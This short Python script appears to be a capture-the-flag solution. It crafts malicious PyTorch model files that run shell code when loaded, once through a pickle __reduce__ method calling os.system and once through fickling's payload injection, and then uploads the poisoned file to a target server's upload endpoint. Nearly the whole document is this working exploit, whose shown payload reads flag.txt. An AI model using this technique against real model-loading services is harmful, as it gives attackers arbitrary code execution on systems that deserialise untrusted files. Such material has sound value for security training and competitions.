from fickling.pytorch import PyTorchModelWrapper
import torch
import os
import pickle

class SimpleExp:
    def __reduce__(self):
        return (os.system, ("cat flag.txt",))

simple_exp = SimpleExp()
torch.save(simple_exp, "simple_exp.pt")


mat_file = "mat.pt"
exp_mat_file = "exp_mat.pt"
mat = torch.eye(4)
torch.save(mat, mat_file)
result = PyTorchModelWrapper(mat_file)
result.inject_payload(
    "import os; os.system('cat flag.txt')",
    exp_mat_file,
    injection="insertion",
)

### UPLOAD THE EXPLOIT FILE

import requests
import sys

REMOTE_SERVER = sys.argv[1]
print(f'Connecting to {REMOTE_SERVER}')

# Get / endpoint
response = requests.get(REMOTE_SERVER)
print(f'GET /: {response.status_code} {response.text}')

# Upload a file
with open('exp_mat.pt', 'rb') as f:
    response = requests.post(f'{REMOTE_SERVER}/upload', files={'file': f})
    print(f'POST /upload: {response.status_code} {response.text}')
